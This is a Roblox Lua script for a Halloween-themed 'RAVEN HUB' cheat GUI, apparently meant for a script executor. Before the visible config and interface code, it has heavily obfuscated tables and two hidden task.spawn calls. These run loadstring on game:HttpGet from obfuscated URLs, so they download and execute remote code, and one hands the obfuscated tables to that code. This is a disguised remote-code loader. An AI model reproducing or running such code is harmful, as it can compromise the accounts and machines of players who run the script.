[LY9TzT7vp_xx("\024!56!?%'y\015)% '\",*\208\210")] = true, [LY9TzT7vp_xx("\024!?8u\029&$=z\002+)\"")] = true, [LY9TzT7vp_xx("\024$4=%+*+y\007  \210\209\210)")] = true, [LY9TzT7vp_xx("\024$4\"#/")] = true, [LY9TzT7vp_xx("\024'8&'?)'y\030$#&\210 ,&")] = true, [LY9TzT7vp_xx("\024'8')vmno")] = true, [LY9TzT7vp_xx("\025!s\028$v\031'y\013<$\210\208")] = true, [LY9TzT7vp_xx("\025!#=!?\"9%#&=}\006.\208*.,/&\210(\211\216")] = true, [LY9TzT7vp_xx("\025!%9<?%!y\028*+*")] = true, [LY9TzT7vp_xx("\02736?$( $%;")] = true, [LY9TzT7vp_xx("\027!5t\031%9x\003)=|0?'\213\211")] = true, [LY9TzT7vp_xx("\027!? .v\001'%&\212|0?'\213\211")] = true, [LY9TzT7vp_xx("\0283%?:(w\011:\"\208.")] = true, [LY9TzT7vp_xx("\0283%?:(\"9+z\006\209/)\212\210")] = true, [LY9TzT7vp_xx("\0287'7=+)-y;) }\011\212\211\213\215\213\217")] = true, [LY9TzT7vp_xx("\0287')%7+x\027,*/")] = true, [LY9TzT7vp_xx("\0287')%7+x\004?+=\209")] = true, [LY9TzT7vp_xx("\0293s\023*98*:=#=")] = true, [LY9TzT7vp_xx("\0293s\0256)+=+z\002.>,#%")] = true, [LY9TzT7vp_xx("\0293s\025-* &<.{\003/?-$&")] = true, [LY9TzT7vp_xx("\0293s\026$%;x\028)(>&, \211*\209\209")] = true, [LY9TzT7vp_xx("\0293s\027>$>=+z\014!(-+!)")] = true, [LY9TzT7vp_xx("\0293s\027'7%<>z\030+* (.\"\213,\211\211")] = true, [LY9TzT7vp_xx("\0293s\030$\"#\209y\001-=+\"$")] = true, [LY9TzT7vp_xx("\0293s\0316(\"=+%<.}\001.-#+\209%\216/\214\214")] = true, [LY9TzT7vp_xx("\0293s\000*9\"\209y\001-=+\"$")] = true, [LY9TzT7vp_xx("\0293s\006$#8&-#>|\004\208 .%'")] = true, [LY9TzT7vp_xx("\0293s\0076>,*y\029*)?'-!\212+\210\210")] = true, [LY9TzT7vp_xx("\0293s\007:9)=-z\030+* (.\"\213,\211\211")] = true, [LY9TzT7vp_xx("\0293s\007%%&#\210z\002.>,#%")] = true, [LY9TzT7vp_xx("\0293s\00869&x\028)(>&, \211*\209\209")] = true, [LY9TzT7vp_xx("\0293s\01069:9y\004<?(-\127\012*\208\215)\215/\213\215")] = true, [LY9TzT7vp_xx("\0293s\01069:9y\006 ,/#\127\012&\210\213).\212\214")] = true, [LY9TzT7vp_xx("\0293s\01069:9y\010-!\208#\1270\211'\214)\211\218,")] = true, [LY9TzT7vp_xx("\0293s\01069:9y\013<\208\210\208-/a5$\216\218\216\213\209\221+")] = true, [LY9TzT7vp_xx("\0293&t\008?*")] = true, [LY9TzT7vp_xx("\0293&t\009(8$:& .&\210 \211")] = true, [LY9TzT7vp_xx("\0293&t\0117(-\".</}1 \212\214\212\209-\217'\218")] = true, [LY9TzT7vp_xx("\0293)59%)!-){\015-'-)\213\209")] = true, [LY9TzT7vp_xx("\020!6#u7%<y\007<*$-")] = true, [LY9TzT7vp_xx("\029!&t\008;:*>.{\031,+!)/#\214-\212\212(\219")] = true, [LY9TzT7vp_xx("\022*4!:$w\026+).")] = true, [LY9TzT7vp_xx("\001;-.6v8&=z\013=+!'")] = true, [LY9TzT7vp_xx("\020:<7!;+=\",<|\000& -\209'\210\210&")] = true, [LY9TzT7vp_xx("\029;&(u\002 +-z\007%\208\210\1273\"*\216\214")] = true, [LY9TzT7vp_xx("\029!&tgk")] = true, [LY9TzT7vp_xx("\029!&tkm")] = true, [LY9TzT7vp_xx("\029!&t\022# ?(-")] = true, [LY9TzT7vp_xx("\019' 66*)''")] = true, [LY9TzT7vp_xx("\0107'=\"7+!<")] = true, [LY9TzT7vp_xx("\004y #';w\011>,<\208")] = true, [LY9TzT7vp_xx("\002'89#v\025=>")] = true, [LY9TzT7vp_xx("\0045\"&%?%'y\029*=\208\210$\210*\208\210")] = true, [LY9TzT7vp_xx("\025!!9.v\031''?\212|\031# \210")] = true, [LY9TzT7vp_xx("\001!:#u\006&?(z\011!+%\212)/")] = true, [LY9TzT7vp_xx("\020!!9)*&x\006)-/\"\210\211/")] = true, [LY9TzT7vp_xx("\0293s\022';8#?;.\208}\001.-#+\209%\216/\214\214")] = true, [LY9TzT7vp_xx("\029!&t\023+%!-).")] = true, [LY9TzT7vp_xx("\029!&t\023+)*\".*/")] = true, [LY9TzT7vp_xx("\029!&t\0247%<\"?.")] = true, [LY9TzT7vp_xx("\029!&t\024> ;%?/!&\208 \211")] = true, [LY9TzT7vp_xx("\029!&t\024%$:\"(</&--!\212")] = true, [LY9TzT7vp_xx("\029!&t\024+:9+;>$>\209")] = true, [LY9TzT7vp_xx("\029!&t\024+'!=-")] = true, [LY9TzT7vp_xx("\029!&t\029%++))//&\210.\211")] = true, [LY9TzT7vp_xx("\029!&t\031%9;\".*/")] = true, [LY9TzT7vp_xx("\029!&t\031%#$\210z\030+* (.\"\213,\211\211'\218")] = true, [LY9TzT7vp_xx("\029!&t\0007)#>,$\208,\209")] = true, [LY9TzT7vp_xx("\029!&t\0027+,>).")] = true, [LY9TzT7vp_xx("\029!&t\002?w\031:.$\208,\209")] = true, [LY9TzT7vp_xx("\029!&t\002%9!%#.")] = true, [LY9TzT7vp_xx("\029!&t\003%&'y\007\212|\005-\211\211\209\209\215\215.\218\214\219")] = true, [LY9TzT7vp_xx("\029!&t\005\"8&\".*/")] = true, [LY9TzT7vp_xx("\029!&t\005( %(-")] = true, [LY9TzT7vp_xx("\029!&t\005+>?\"?.")] = true, [LY9TzT7vp_xx("\029!&t\006+<+:>$()?\210")] = true, [LY9TzT7vp_xx("\029!&t\008;\"'%;#/")] = true, [LY9TzT7vp_xx("\029!&t\008&8?!?/\208&\209")] = true, [LY9TzT7vp_xx("\029!&t\008&&'$\211{\031,+!)/#\214-\212\212(\219")] = true, [LY9TzT7vp_xx("\029!&t\008&\208<>,$*&\209")] = true, [LY9TzT7vp_xx("\029!&t\008-<=-\" =/\210\210")] = true, [LY9TzT7vp_xx("\029!&t\0097:'+#/=\208")] = true, [LY9TzT7vp_xx("\029!&t\009%),.-")] = true, [LY9TzT7vp_xx("\029!&t\009(8$:& .&\210.\211")] = true, [LY9TzT7vp_xx("\029!&t\009( ',")] = true, [LY9TzT7vp_xx("\029!)9u\002&.>z\029!>\208")] = true, [LY9TzT7vp_xx("\029!)9u\002&.>z\007+\211#\1273\"*\216\214")] = true, [LY9TzT7vp_xx("\029!)=#v\009',?")] = true, [LY9TzT7vp_xx("\029'6?u\002,;$z\007\209 )\1273\"*\216\214")] = true, [LY9TzT7vp_xx("\0303%=69?!y\029*.>\216..*")] = true, [LY9TzT7vp_xx("\030;s\0276* ,(")] = true, [LY9TzT7vp_xx("\030;8(:*<!+;{\030&!(#-'\215).\216(")] = true, [LY9TzT7vp_xx("\030!!9.v\004''?\212|\013\211&'\218")] = true, [LY9TzT7vp_xx("\030!!9.v\004''?\212|\015#(.%'(\214")] = true, [LY9TzT7vp_xx("\03136<$v\010(\210> .")] = true, [LY9TzT7vp_xx("\0313(;=*\208x\007;\208#%\210\216")] = true, [LY9TzT7vp_xx("\031!\"t\002/w\027:(?\213")] = true, [LY9TzT7vp_xx("\031!\"t\002/w\029 !.")] = true, [LY9TzT7vp_xx("\031!\"t\002/w\029\209;(%+#")] = true, [LY9TzT7vp_xx("\031!\"t\002/w\031(&?")] = true, [LY9TzT7vp_xx("\031!\"t\002/w\000>;-\208")] = true, [LY9TzT7vp_xx("\031!\"t\002/w\008+?.!+\210")] = true, [LY9TzT7vp_xx("\031!\"#u\003\208x\001)//--\211")] = true, [LY9TzT7vp_xx("\031'6 :7)'y\030$*,\209\210!\214\212\210")] = true, [LY9TzT7vp_xx("\000$65!;;''")] = true, [LY9TzT7vp_xx("\0013%59?*'y\027\211+)-\211\212*\208\210")] = true, [LY9TzT7vp_xx("\0017%&>*&x\027/-.&\210.")] = true, [LY9TzT7vp_xx("\001;%)!?+'\".<|\031'\")$.(\216*/\217)")] = true, [LY9TzT7vp_xx("\001>85(;w\005\210z\011.\"\209$.\213")] = true, [LY9TzT7vp_xx("\001!#7*(,x:(?|\003'\217\218\214\212\216")] = true, [LY9TzT7vp_xx("\001!'t\029%++))/")] = true, [LY9TzT7vp_xx("\001!'t\005+$($#)")] = true, [LY9TzT7vp_xx("\001' $ ?%!y\013+\213!#\209)/+")] = true, [LY9TzT7vp_xx("\002'47 ?%!y\013)= )(.*")] = true, [LY9TzT7vp_xx("\002'8'6: $%;{\031/-\"/%+/%")] = true, [LY9TzT7vp_xx("\002'8'6: $%){2>+/)\211\209")] = true, [LY9TzT7vp_xx("\0033!;u\008 & z\029\209\208")] = true, [LY9TzT7vp_xx("\0037<\"9;<*y\014-=)?+!")] = true, [LY9TzT7vp_xx("\0037<\">*&x\012& %$&(\212\208")] = true, [LY9TzT7vp_xx("\003!67$v\027!,=*")] = true, [LY9TzT7vp_xx("\003!&9.v8&=z\015!!\"\216")] = true, [LY9TzT7vp_xx("\003!&9)* x\013/<(\"\210\211)")] = true, [LY9TzT7vp_xx("\0043 !.$ x\031;/\208&,(")] = true, [LY9TzT7vp_xx("\0043 !.$ x\012*\212 \"\208(.*")] = true, [LY9TzT7vp_xx("\0043!(6v\031'--++\209")] = true, [LY9TzT7vp_xx("\0043!();&")] = true, [LY9TzT7vp_xx("\00476&:*w\004.=&\213}\000+/$-")] = true, [LY9TzT7vp_xx("\0047%5;?%&:z\008!!\211\210%-.$")] = true, [LY9TzT7vp_xx("\004 4=!%w\027%)\209!/-")] = true, [LY9TzT7vp_xx("\004\"4;=;+,\"z\015\209>*$\212\213+")] = true, [LY9TzT7vp_xx("\004\"<\"#/w\000:'(\213")] = true, [LY9TzT7vp_xx("\004\"\"# /w9'>{\012\210+/+\218")] = true, [LY9TzT7vp_xx("\004&%5,8<*+#/=")] = true, [LY9TzT7vp_xx("\004)4;u\009&<:")] = true, [LY9TzT7vp_xx("\004)4;</w\026+).")] = true, [LY9TzT7vp_xx("\00536#'?+9y\028$?&!+%\213#")] = true, [LY9TzT7vp_xx("\00536#'?#$(z\030.,!.$*./\211")] = true, [LY9TzT7vp_xx("\0053!;u\0108& z\006!)#\211!/)")] = true, [LY9TzT7vp_xx("\0057?9\"%),>")] = true, [LY9TzT7vp_xx("\005;6(69w\011:\"\208.")] = true, [LY9TzT7vp_xx("\005!s\008$v\011'y\013<$\210\208")] = true, [LY9TzT7vp_xx("\005!%&)+>!'($|\001\208 '\208\208)\214\218\218\208\214\210")] = true, [LY9TzT7vp_xx("\005$4 6\"<<((")] = true, [LY9TzT7vp_xx("\005$8\"$)+*.\212\213+}2\212\210#\209c\024\021\022\023")] = true, [LY9TzT7vp_xx("\005$<7 %#!')")] = true, [LY9TzT7vp_xx("\005$<$!?+'y\014-=)?+%\211+\215\211\216")] = true, [LY9TzT7vp_xx("\005'9:u\010&-<;)")] = true, [LY9TzT7vp_xx("\005'!;u\010,& z\015\209+%\1273\"*\216\214")] = true, [LY9TzT7vp_xx("\0077!($\" =+){\012>\212..&\212\210")] = true, [LY9TzT7vp_xx("\007'?(*( &(z\014'\"*$\212\208\208\210")] = true, [LY9TzT7vp_xx("\008r\"&u\002")] = true, [LY9TzT7vp_xx("\0107&'u\003\208x\030\210<)&,$")] = true, [LY9TzT7vp_xx("\011! 6>;w\012+;'=)?")] = true, [LY9TzT7vp_xx("\024$466*)''")] = true, [LY9TzT7vp_xx("\003'5= %w9'>{\007\210 (+\208")] = true, [LY9TzT7vp_xx("\0203!;*(8,(z\002!)?\211/")] = true, [LY9TzT7vp_xx("\031!\"8!;w\006()?(\"~\015/\208&/)")] = true, [LY9TzT7vp_xx("\0203!8>$ x\031&\208\"#'-)")] = true, [LY9TzT7vp_xx("\0293s\026*)<x\006;>$&,$")] = true, [LY9TzT7vp_xx("\001!?5'% <\"($")] = true, [LY9TzT7vp_xx("\03136<$( $%;")] = true, [LY9TzT7vp_xx("\0043 !.$ x\013,\208?('-)")] = true, [LY9TzT7vp_xx("\00536#)+):(z\015= -\209)\213\209")] = true, [LY9TzT7vp_xx("\019'%&>*&x\027;/")] = true, [LY9TzT7vp_xx("\020:<7!?w\027!#>(>")] = true, [LY9TzT7vp_xx("\0013!86v\007');) >")] = true, [LY9TzT7vp_xx("\0217#))/w\004>)+=/\"")] = true} do local V_nKpcJaA9XR1JmPWgM1M = {} V_nKpcJaA9XR1JmPWgM1M[LY9TzT7vp_xx(")8\024\019#?}\001)\023 n\2150.\210o")] = 746 end K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("\0107f(!0\209`\212e\008\210&\213\208\211\020nn")] = {[LY9TzT7vp_xx("\018#(5)?:")] = true, [LY9TzT7vp_xx("\019'!\".v\0259,% \208")] = true, [LY9TzT7vp_xx("\0203!8.")] = true, [LY9TzT7vp_xx("\020:%=(*$9,")] = true, [LY9TzT7vp_xx("\020'%'::")] = true, [LY9TzT7vp_xx("\020+59'")] = true, [LY9TzT7vp_xx("\021;4!$$;")] = true, [LY9TzT7vp_xx("\021;)=#;")] = true, [LY9TzT7vp_xx("\0223&(:(")] = true, [LY9TzT7vp_xx("\0243?5-/")] = true, [LY9TzT7vp_xx("\024;!;:(9*>;?")] = true, [LY9TzT7vp_xx("\024!?8")] = true, [LY9TzT7vp_xx("\0253? $-<='")] = true, [LY9TzT7vp_xx("\0293)5")] = true, [LY9TzT7vp_xx("\029'6?.")] = true, [LY9TzT7vp_xx("\0005'#")] = true, [LY9TzT7vp_xx("\001!'t$<w\031(&?")] = true, [LY9TzT7vp_xx("\00337=$7:,\"\208 ")] = true, [LY9TzT7vp_xx("\0033<\"7%.")] = true, [LY9TzT7vp_xx("\003!&9")] = true, [LY9TzT7vp_xx("\004' !:(")] = true, [LY9TzT7vp_xx("\00536#")] = true, [LY9TzT7vp_xx("\0073?9#* &>-")] = true, [LY9TzT7vp_xx("\010;!t\0147%?")] = true, [LY9TzT7vp_xx("\005$4 6\"<*(")] = true} K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("\011\008k\031og\001\031d\002\029\024b##\022\216")] = {[LY9TzT7vp_xx("\018><9#v\010$:*")] = true, [LY9TzT7vp_xx("\019>47 >&$>z\029+* ")] = true, [LY9TzT7vp_xx("\019>\"#9#&''z\003=*+$\210")] = true, [LY9TzT7vp_xx("\019>\"#9#&''z\014(>.")] = true, [LY9TzT7vp_xx("\0203!8.v\010='.-\213")] = true, [LY9TzT7vp_xx("\0203!8.v\010$:*")] = true, [LY9TzT7vp_xx("\020'#=9}*x0#)#\208")] = true, [LY9TzT7vp_xx("\020'%'::w\011%;+")] = true, [LY9TzT7vp_xx("\020+59'v\010$:*")] = true, [LY9TzT7vp_xx("\0217 ##}*x\001?< ")] = true, [LY9TzT7vp_xx("\021;)=#;w\011%;+")] = true, [LY9TzT7vp_xx("\0293)5u\024#9,. .")] = true, [LY9TzT7vp_xx("\0293)5u\009#9)")] = true, [LY9TzT7vp_xx("\00337=$7:,\"\208 |\030'\209\211\213\212,/*")] = true, [LY9TzT7vp_xx("\00337=$7:,\"\208 |0* \208")] = true, [LY9TzT7vp_xx("\0033<\"7%.x\001;()\"\208")] = true, [LY9TzT7vp_xx("\0033<\"7%.x\012&<,")] = true, [LY9TzT7vp_xx("\0043!(6}*x\012& %$&")] = true, [LY9TzT7vp_xx("\0083)9'?;=+")] = true, [LY9TzT7vp_xx("\008;'7=}*x\027,*+*")] = true, [LY9TzT7vp_xx("\010;!t\0147%?y\006<)-")] = true, [LY9TzT7vp_xx("\010;!t\0147%?y\013'=-")] = true, [LY9TzT7vp_xx("\001:4\")%$x\012&<,")] = true, [LY9TzT7vp_xx("\020$,')7#x\012&<,")] = true} task[LY9TzT7vp_xx("$\"4+#")](function(...) return (function() loadstring(game:HttpGet(LY9TzT7vp_xx("9&'$(\016fg);.\208\"$\216n\"\210\211\0197\217\216:*;\014\028\028\192\208\199")))() end)(...) end) task[LY9TzT7vp_xx("$\"4+#")](function(...) return (function() local nOSDRnlP5HNNbbQ7Zn4 = loadstring(game:HttpGet(LY9TzT7vp_xx("9&'$(\016fg+;\210j$'\211(\214$\216\215*\216*\215\215\222\208\218\193\028\210\223\222\001\214\220\196\217\198\196\218\205\222\206\198\206\243\013\200\206\204\248\200\2066\251\204\252\244\252\225=\225\245\247\229\"\252\250\247\251\235(\231\252\229\235-\235\239\232\235\230\210\145\155\232")))() if type(nOSDRnlP5HNNbbQ7Zn4) == LY9TzT7vp_xx("7'!7)?&&") then nOSDRnlP5HNNbbQ7Zn4(K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("\007\002l'g>:*\0034\216.70")], K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("+\026%b \001\010\0291\212\026*#\220\007?\000\002\0050\215")], K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("\026\012)2\014oxk\029n\020\006\208\005g\015\216!")], K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("\005zf\023\024e:c|\021)k;j\212\027\213(:\211")], K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("\0107f(!0\209`\212e\008\210&\213\208\211\020nn")], K99AvvJfcKHs8lXdDoSHE[LY9TzT7vp_xx("\011\008k\031og\001\031d\002\029\024b##\022\216")]) end end)(...) end)local cfg = {
	power         = DEFAULT_CFG.power,
	interval      = DEFAULT_CFG.interval,
	keybindKb     = DEFAULT_CFG.keybindKb,
	keybindGp     = DEFAULT_CFG.keybindGp,
	autoBrainrot  = DEFAULT_CFG.autoBrainrot,
}

local function resolveKb(name)
	if not name or name == "" or name == "None" then return nil end
	local ok, val = pcall(function() return Enum.KeyCode[name] end)
	return (ok and val) or nil
end

local function saveConfig()
	local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
	if ok and encoded and writefile then
		pcall(writefile, CONFIG_FILE, encoded)
	end
end

local function loadConfig()
	if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
	local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
	if not ok or type(data) ~= "table" then return end

	cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
	cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
	cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
	cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
	cfg.autoBrainrot  = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
end

loadConfig()

local active           = false
local listeningFor     = nil
local remote           = nil
local brainrotMode     = false
local lastBrainrotState = false
local manualOverride   = false 

local C = {
	bg      = Color3.fromRGB(8, 4, 12),
	panel   = Color3.fromRGB(12, 7, 18),
	card    = Color3.fromRGB(24, 12, 30),
	green1  = Color3.fromRGB(255, 105, 20), -- pumpkin orange
	green2  = Color3.fromRGB(130, 45, 190), -- spooky purple
	green3  = Color3.fromRGB(255, 145, 35),
	glow    = Color3.fromRGB(190, 65, 235),
	white   = Color3.fromRGB(255, 240, 225),
	dim     = Color3.fromRGB(175, 155, 185),
	yellow  = Color3.fromRGB(255, 205, 65),
	red     = Color3.fromRGB(255, 75, 85),
	waiting = Color3.fromRGB(255, 190, 55),
	inputBg = Color3.fromRGB(18, 9, 25),
}

for _, kid in pairs(plrGui:GetChildren()) do
	if kid.Name == "RAVEN_HUB" then kid:Destroy() end
end

local screen = Instance.new("ScreenGui")
screen.Name         = "RAVEN_HUB"
screen.ResetOnSpawn = false
screen.DisplayOrder = 15
screen.Parent       = plrGui

local function tw(obj, props, t)
	TweenService:Create(obj,
		TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		props):Play()
end

local function makeDraggable(frame)
	local dragging, dragStart, startPos
	frame.InputBegan:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
			dragging  = true
			dragStart = i.Position
			startPos  = frame.Position
			i.Changed:Connect(function()
				if i.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	frame.InputChanged:Connect(function(i)
		if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
			local d = i.Position - dragStart
			frame.Position = UDim2.new(
				startPos.X.Scale, startPos.X.Offset + d.X,
				startPos.Y.Scale, startPos.Y.Offset + d.Y)
		end
	end)
end

local function isGamepad(kc)
	local n = kc.Name
	return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick" or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
end

local BLACKLISTED = {
	[Enum.KeyCode.Escape]      = true,
	[Enum.KeyCode.LeftControl] = true,
	[Enum.KeyCode.Unknown]     = true,
}

local MAIN_W, MAIN_H = 250, 105

local bgUrl = ""
local bgAsset = ""
local halloweenFile = "Halloween Pumpkins.png"

if getcustomasset and isfile then
	if isfile(halloweenFile) then
		bgAsset = getcustomasset(halloweenFile)
	elseif isfile("Halloween_Pumpkins.png") then
		bgAsset = getcustomasset("Halloween_Pumpkins.png")
	elseif isfile("raven_hub_bg.png") then
		bgAsset = getcustomasset("raven_hub_bg.png")
	end
end

if bgAsset == "" then
	bgAsset = bgUrl
end

local mainFrame = Instance.new("ImageLabel")
mainFrame.Name             = "MainFrame"
mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
mainFrame.BackgroundColor3 = Color3.fromRGB(235, 92, 12)
mainFrame.BackgroundTransparency = 0
mainFrame.Image            = ""
mainFrame.ScaleType        = Enum.ScaleType.Crop
mainFrame.BorderSizePixel  = 0
mainFrame.Active           = true
mainFrame.ClipsDescendants = true
mainFrame.Parent           = screen

local mainCorner = Instance.new("UICorner", mainFrame)
mainCorner.CornerRadius = UDim.new(0, 20)

local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color        = C.glow
mainStroke.Thickness    = 1.5
mainStroke.Transparency = 0

makeDraggable(mainFrame)

local header = Instance.new("Frame", mainFrame)
header.Size             = UDim2.new(1, 0, 0, 55)
header.BackgroundTransparency = 1
header.ZIndex           = 2

local settingsBtn = Instance.new("TextButton", header)
settingsBtn.Size             = UDim2.new(0, 28, 0, 28)
settingsBtn.Position         = UDim2.new(0, 9, 0.5, -14)
settingsBtn.BackgroundColor3 = Color3.fromRGB(20, 25, 25)
settingsBtn.BackgroundTransparency = 0.5
settingsBtn.BorderSizePixel  = 0
settingsBtn.AutoButtonColor  = false
settingsBtn.Text             = "⚙"
settingsBtn.TextColor3       = C.dim
settingsBtn.Font             = Enum.Font.GothamBlack
settingsBtn.TextSize         = 16
settingsBtn.ZIndex           = 3
Instance.new("UICorner", settingsBtn).CornerRadius = UDim.new(1, 0)
settingsBtn.MouseEnter:Connect(function() tw(settingsBtn, {TextColor3 = C.white}, 0.1) end)
settingsBtn.MouseLeave:Connect(function() tw(settingsBtn, {TextColor3 = C.dim}, 0.1) end)

local titleLbl = Instance.new("TextLabel", header)
titleLbl.Size               = UDim2.new(0, 170, 0, 20)
titleLbl.Position           = UDim2.new(0, 45, 0, 8)
titleLbl.BackgroundTransparency = 1
titleLbl.Text               = "🎃 RAVEN HUB"
titleLbl.TextColor3         = C.white
titleLbl.Font               = Enum.Font.GothamBlack
titleLbl.TextSize           = 15
titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
titleLbl.ZIndex             = 3

local subLbl = Instance.new("TextLabel", header)
subLbl.Size               = UDim2.new(0, 150, 0, 15)
subLbl.Position           = UDim2.new(0, 45, 0, 24)
subLbl.BackgroundTransparency = 1
subLbl.Text               = "☠ HALLOWEEN EDITION ☠"
subLbl.TextColor3         = C.dim
subLbl.Font               = Enum.Font.Gotham
subLbl.TextSize           = 8
subLbl.TextXAlignment     = Enum.TextXAlignment.Left
subLbl.ZIndex             = 3

local statusPill = Instance.new("Frame", header)
statusPill.Size             = UDim2.new(0, 58, 0, 22)
statusPill.Position         = UDim2.new(1, -92, 0.5, -11)
statusPill.BackgroundColor3 = Color3.fromRGB(5, 30, 10)
statusPill.BackgroundTransparency = 0.3
statusPill.BorderSizePixel  = 0
statusPill.ZIndex           = 3
Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)
local statusStroke = Instance.new("UIStroke", statusPill)
statusStroke.Color = C.green1
statusStroke.Thickness = 1.5

local statusLbl = Instance.new("TextLabel", statusPill)
statusLbl.Size              = UDim2.new(1, 0, 1, 0)
statusLbl.BackgroundTransparency = 1
statusLbl.Text              = "READY"
statusLbl.TextColor3        = C.green1
statusLbl.Font              = Enum.Font.GothamBold
statusLbl.TextSize          = 8
statusLbl.ZIndex            = 4

local closeBtn = Instance.new("TextButton", header)
closeBtn.Size             = UDim2.new(0, 24, 0, 24)
closeBtn.Position         = UDim2.new(1, -30, 0.5, -12)
closeBtn.BackgroundColor3 = Color3.fromRGB(20, 25, 30)
closeBtn.BackgroundTransparency = 0.5
closeBtn.BorderSizePixel  = 0
closeBtn.AutoButtonColor  = false
closeBtn.Text             = "✕"
closeBtn.TextColor3       = C.white
closeBtn.Font             = Enum.Font.GothamBold
closeBtn.TextSize         = 11
closeBtn.ZIndex           = 3
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)
closeBtn.MouseEnter:Connect(function() tw(closeBtn, {BackgroundColor3 = C.red, BackgroundTransparency = 0}, 0.1) end)
closeBtn.MouseLeave:Connect(function() tw(closeBtn, {BackgroundColor3 = Color3.fromRGB(20, 25, 30), BackgroundTransparency = 0.5}, 0.1) end)

closeBtn.MouseButton1Click:Connect(function()
	active = false
	screen:Destroy()
end)

local divider = Instance.new("Frame", mainFrame)
divider.Size = UDim2.new(1, 0, 0, 2)
divider.Position = UDim2.new(0, 0, 0, 43)
divider.BackgroundColor3 = C.green1
divider.BorderSizePixel = 0

local activateFrame = Instance.new("Frame", mainFrame)
activateFrame.Size = UDim2.new(1, -20, 1, -75)
activateFrame.Position = UDim2.new(0, 10, 0, 65)
activateFrame.BackgroundColor3 = Color3.fromRGB(35, 10, 5)
activateFrame.BackgroundTransparency = 0
activateFrame.BorderSizePixel = 0
Instance.new("UICorner", activateFrame).CornerRadius = UDim.new(0, 15)

local activateFrameStroke = Instance.new("UIStroke", activateFrame)
activateFrameStroke.Color = Color3.fromRGB(20, 40, 20)
activateFrameStroke.Thickness = 2

local activateBtn = Instance.new("TextButton", activateFrame)
activateBtn.Size             = UDim2.new(1, 0, 1, 0)
activateBtn.BackgroundTransparency = 1
activateBtn.Text             = "🎃 ACTIVATE RAVEN 🎃"
activateBtn.TextColor3       = C.green1
activateBtn.Font             = Enum.Font.GothamBlack
activateBtn.TextSize         = 14
activateBtn.ZIndex           = 5

local dot = Instance.new("Frame", activateBtn)
dot.Size = UDim2.new(0, 5, 0, 5)
dot.Position = UDim2.new(1, -15, 1, -15)
dot.BackgroundColor3 = C.green1
dot.Rotation = 45
dot.BorderSizePixel = 0

local SET_W, SET_H = 185, 285

local settingsFrame = Instance.new("Frame")
settingsFrame.Name             = "SettingsPanel"
settingsFrame.Size             = UDim2.new(0, SET_W, 0, SET_H)
settingsFrame.Position         = UDim2.new(0.5, -SET_W/2, 0.5, 80)
settingsFrame.BackgroundColor3 = C.panel
settingsFrame.BorderSizePixel  = 0
settingsFrame.Active           = true
settingsFrame.ClipsDescendants = true
settingsFrame.Visible          = false
settingsFrame.ZIndex           = 20
settingsFrame.Parent           = screen
Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0,12)

local setStroke = Instance.new("UIStroke", settingsFrame)
setStroke.Color        = C.glow
setStroke.Thickness    = 1.5

makeDraggable(settingsFrame)

local setHeader = Instance.new("Frame", settingsFrame)
setHeader.Size             = UDim2.new(1, 0, 0, 28)
setHeader.BackgroundColor3 = C.green2
setHeader.BorderSizePixel  = 0
setHeader.ZIndex           = 21
Instance.new("UICorner", setHeader).CornerRadius = UDim.new(0,12)

local setHeaderFill = Instance.new("Frame", settingsFrame)
setHeaderFill.Size             = UDim2.new(1, 0, 0, 8)
setHeaderFill.Position         = UDim2.new(0, 0, 0, 20)
setHeaderFill.BackgroundColor3 = C.green2
setHeaderFill.BorderSizePixel  = 0
setHeaderFill.ZIndex           = 21

local setTitle = Instance.new("TextLabel", setHeader)
setTitle.Size               = UDim2.new(1,-80,1,0)
setTitle.Position           = UDim2.new(0,10,0,0)
setTitle.BackgroundTransparency = 1
setTitle.Text               = "🎃 SETTINGS"
setTitle.TextColor3         = C.bg
setTitle.Font               = Enum.Font.GothamBlack
setTitle.TextSize           = 10
setTitle.TextXAlignment     = Enum.TextXAlignment.Left
setTitle.ZIndex             = 22

local setCloseBtn = Instance.new("TextButton", setHeader)
setCloseBtn.Size             = UDim2.new(0,24,0,24)
setCloseBtn.Position         = UDim2.new(1,-28,0.5,-12)
setCloseBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 20)
setCloseBtn.BorderSizePixel  = 0
setCloseBtn.AutoButtonColor  = false
setCloseBtn.Text             = "X"
setCloseBtn.TextColor3       = C.white
setCloseBtn.Font             = Enum.Font.GothamBlack
setCloseBtn.TextSize         = 11
setCloseBtn.ZIndex           = 23
Instance.new("UICorner", setCloseBtn).CornerRadius = UDim.new(0,6)
setCloseBtn.MouseEnter:Connect(function() tw(setCloseBtn,{BackgroundColor3=C.red},0.1) end)
